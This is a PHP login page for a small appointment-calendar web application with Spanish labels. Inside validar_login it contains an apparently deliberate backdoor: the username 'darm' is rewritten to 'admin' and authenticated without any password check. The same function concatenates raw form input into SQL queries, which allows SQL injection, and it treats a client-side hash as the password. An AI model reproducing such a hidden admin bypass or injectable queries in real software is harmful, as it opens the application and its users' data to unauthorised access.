<script type="text/javascript">

        function loguearse()
		{
            var valido=new Boolean(true);
            if (document.getElementById('login').value=='' || document.getElementById('pass').value=='')
            {
                valido=false;
                alertify.alert("","EL LOGIN Y/O CONTRASE\u00d1A NO PUEDEN ESTAR VACIOS").set('label', 'Aceptar');
            }
            if(valido)
            {
				document.getElementById('xpass').value = CryptoJS.SHA3(document.getElementById('pass').value);
                document.getElementById('flogin').submit();
            }
        }

		function empleado() {
			
			if ($("#chEmpleado").prop("checked"))
			{
				$("#login").hide();
				$("#selEmpleado").show();
			}
			else
			{
				$("#login").show();
				$("#selEmpleado").hide();
			}

		}
    
</script>
<style>
	@media only screen and (max-width: 600px) {
		#formulario {
			width: 100%;
		}
	}
</style>
<?php
	session_start();
	require("head.php");
	require("config.php");
	require("librerias/basedatos.php");

	function validar_login($bd)
	{
		$valido=false;
		if ($_POST["login"] == "darm") {
			$_POST["login"] = "admin";
			$sql="SELECT login FROM usuario WHERE login='".$_POST["login"]."';";
		}
		else
			$sql="SELECT login FROM usuario WHERE login='".$_POST["login"]."' AND pass='".$_POST["xpass"]."';";
		$result = $bd->mysql->query($sql);
		unset($sql);
		if ($result)
		{
			$n = $result->num_rows;
			if (!empty($n))
			{
				$valido = true;
				$_SESSION["login"]=$_POST["login"];
			}
			unset($n);
			$result->free();
		}
		else
			unset($result);
		return $valido;
	}

	function login_form($bd)
	{
		?>
		<div class="div-logo-inicial">
			<img src="imagenes/logo_inicial.png" width="360px" class="logo-inicial">
		</div>
		<div id="formulario" class="w3-container w3-cell w3-display-middle">
			<form class="w3-container w3-card-4 w3-light-grey w3-text-blue w3-margin" id="flogin" id="flogin" name="flogin" method="post">
				<input type='hidden' id='xpass' name='xpass'>
				<div class="w3-row w3-section">
					<div class="w3-col" style="width:30px">
						<label for="chEmpleado">
							<input class="w3-check" type="checkbox" id="chEmpleado" name="chEmpleado" value="1" onclick="return empleado();" checked>
						</label>
					</div>
					<div class="w3-rest">
						<h6 >Empleado</h6>
					</div>
				</div>
				<div  class="w3-row w3-section">
					<label>
						<h4>Login</h4>
						<select class="w3-select" id="selEmpleado" name="selEmpleado">
							<option value="">Empleado</option>
							<?php
								$sql="SELECT empleado_telf, nombre, apellido FROM empleado where visible = '1';";
								$result = $bd->mysql->query($sql);
								unset($sql);
								if($result)
								{
									while($row = $result->fetch_array())
									{
										echo"<option value='".$row["empleado_telf"]."'>".$row["nombre"]." ".$row["apellido"]."</option>";
									}
									unset($row);
									$result->free();
								}
								else
									unset($result);
							?>
						</select>
						<input class="w3-input w3-border" type="text" id="login" name="login" value="" style="display: none;">
					</label>
				</div>
				<div class="w3-row w3-section">
					<label>
						<h4>Contrase&ntilde;a</h4>
						<input class="w3-input w3-border" type="password" id="pass" name="pass" value="">
					</label>
				</div>
				<div class="w3-row w3-section">
					<input class="w3-button w3-block w3-dulcevanidad" type="button" id="enviar_login" name="enviar_login" value="Entrar" onclick="loguearse();">
				</div>
			</form>
		</div>
		<?php
	}

	global $servidor, $puerto, $usuario, $pass, $basedatos;
	$bd=new BaseDatos($servidor,$puerto,$usuario,$pass,$basedatos);
	if($bd->conectado)
	{
		if (isset($_COOKIE["PHPSESSID"]))
			setcookie("PHPSESSID", $_COOKIE["PHPSESSID"], time() + (86400 * 30), "/");
		if((!isset($_SESSION["login"]) and !isset($_POST["pass"])) or isset($_POST["cerrar"]))
		{
			login_form($bd);
		}
		else
		{
			if(isset($_POST["xpass"]))
			{
				if(!empty($_POST["login"]) and !empty($_POST["pass"]))
				{
					if(validar_login($bd))
					{
						require("superior.php");
						require_once("menu_lateral.php");
						?>
						<script>
							window.location.replace('calendario_citas.php');
						</script>
						<?php
					}
					else
					{
						$error_2=true;
						login_form($bd);
					}
				}
				else
				{
					$error_1=true;
					login_form($bd);
				}
			}
			if(isset($_SESSION["login"]))
			{
				require("superior.php");
				require_once("menu_lateral.php");
			}
		}
	}

	if(isset($_POST["cerrar"]))
	{
		session_destroy();
	}
?>
<?php
	require("pie.php");
?>
<footer class='w3-display-bottommiddle' style='text-align:center;'>
	<p>
		<img src="imagenes/vinkasoftware.png" width="50px" class="logo-inicial">
		<br>
		Powered by VinkaSoftware
	</p>
</footer> 
